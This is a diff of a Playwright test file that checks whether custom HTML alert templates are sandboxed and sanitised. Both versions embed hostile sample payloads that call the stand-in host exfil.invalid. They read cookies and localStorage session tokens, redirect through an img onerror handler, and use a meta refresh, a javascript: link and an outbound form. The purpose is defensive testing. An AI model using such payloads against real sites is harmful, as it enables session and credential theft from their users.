@@ -188,7 +188,7 @@ test.describe('Alert box editor v2 states (loading, empty, error, success)', () 
 test.describe('Custom HTML/CSS sandbox security isolation', () => {
   test.use({ viewport: { width: 1280, height: 800 } })
 
-  test('custom code runs only inside sandbox iframe without allow-same-origin and cannot read cookies, localStorage or API session', async ({
+  test('a hostile custom template renders inert: no script, handler, redirect or form, and no access to cookies, storage or the API session', async ({
     page,
   }) => {
     await open(page, 'alerts/follow')
@@ -222,42 +222,41 @@ test.describe('Custom HTML/CSS sandbox security isolation', () => {
       if (req.url().includes('exfil.invalid')) blockedRequests.push(req.url())
     })
 
-    // Inject hostile script reading cookie, localStorage, parent DOM/storage, and __FERROCAST__
-    const hostileHtml = `<div id="exfil-report">running</div><script>
-(function(){
-  var r = [];
-  try { r.push('cookie=' + (document.cookie || 'EMPTY')); } catch (e) { r.push('cookie=BLOCKED:' + e.name); }
-  try { r.push('ls=' + (window.localStorage.getItem('ferro_api_session') || 'EMPTY')); } catch (e) { r.push('ls=BLOCKED:' + e.name); }
-  try { r.push('p_cookie=' + window.parent.document.cookie); } catch (e) { r.push('p_cookie=BLOCKED:' + e.name); }
-  try { r.push('p_ls=' + window.parent.localStorage.getItem('ferro_api_session')); } catch (e) { r.push('p_ls=BLOCKED:' + e.name); }
-  try { r.push('p_session=' + JSON.stringify(window.parent.__FERROCAST__)); } catch (e) { r.push('p_session=BLOCKED:' + e.name); }
-  try {
-    fetch('https://exfil.invalid/steal').then(function(){
-      document.getElementById('exfil-report').textContent += ' | fetch=ALLOWED';
-    }).catch(function(err){
-      document.getElementById('exfil-report').textContent = r.join(' | ') + ' | fetch=BLOCKED:' + err.name;
-    });
-  } catch (e) {
-    r.push('fetch=BLOCKED:' + e.name);
-  }
-  document.getElementById('exfil-report').textContent = r.join(' | ');
-})();
-</script>`
+    // Hostile template: custom alerts are HTML and CSS only, so none of this may run.
+    const hostileHtml = `<div id="exfil-report">running</div>
+<script>document.getElementById('exfil-report').textContent = 'SCRIPT RAN ' + document.cookie + localStorage.getItem('ferro_api_session');</script>
+<img id="bad-img" src="data:," onerror="location.replace('https://exfil.invalid/?d=' + document.body.textContent)">
+<meta http-equiv="refresh" content="0;url=https://exfil.invalid/refresh">
+<a id="bad-link" href="javascript:alert(1)">x</a>
+<form action="https://exfil.invalid/form"><input name="q"></form>
+<p id="viewer">{name}</p>`
 
     await page.getByLabel('Custom HTML', { exact: true }).fill(hostileHtml)
 
-    const report = frame.locator('#exfil-report')
-    await expect(report).toContainText('cookie=BLOCKED')
-    await expect(report).toContainText('ls=BLOCKED')
-    await expect(report).toContainText('p_cookie=BLOCKED')
-    await expect(report).toContainText('p_ls=BLOCKED')
-    await expect(report).toContainText('p_session=BLOCKED')
-    await expect(report).toContainText('fetch=BLOCKED')
+    // The editor says why it can't be saved.
+    await expect(
+      page
+        .getByRole('alert')
+        .filter({ hasText: /can't use <script>/ })
+        .first(),
+    ).toBeVisible()
+    await expect(page.getByRole('button', { name: 'Save', exact: true })).toBeDisabled()
 
-    const text = await report.innerText()
+    // The preview frame still draws the harmless part and runs none of the rest.
+    const report = frame.locator('#exfil-report')
+    await expect(report).toHaveText('running')
+    await expect(frame.locator('#viewer')).toHaveText('NovaRiver')
+    await expect(
+      frame.locator('#fc-custom-root').locator('script, meta, form, input, [onerror]'),
+    ).toHaveCount(0)
+    await expect(frame.locator('#bad-link')).not.toHaveAttribute('href', /.+/)
+    // Give an onerror or a refresh time to fire, were it still there.
+    await page.waitForTimeout(800)
+    await expect(report).toHaveText('running')
+    expect(blockedRequests).toEqual([])
+    const text = await frame.locator('body').innerText()
     expect(text).not.toContain('secret_cookie_val')
     expect(text).not.toContain('secret_local_token')
     expect(text).not.toContain('secret_desktop_session')
-    expect(blockedRequests).toEqual([])
   })
 })
